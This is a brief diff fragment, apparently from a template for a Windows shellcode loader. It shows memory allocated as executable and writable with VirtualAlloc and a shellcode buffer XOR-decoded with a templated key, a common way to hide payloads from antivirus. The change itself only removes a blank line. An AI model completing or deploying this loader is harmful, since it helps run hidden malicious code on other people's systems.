@@ -21,7 +21,6 @@ Externally defined xorShellcode function:
 
 
 #include <windows.h>
-
 int main( int argc, char *argv[] ) {
     void *exec = VirtualAlloc( 0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
     xorShellcode(shellcode, shellcode_size, "${KEY}");
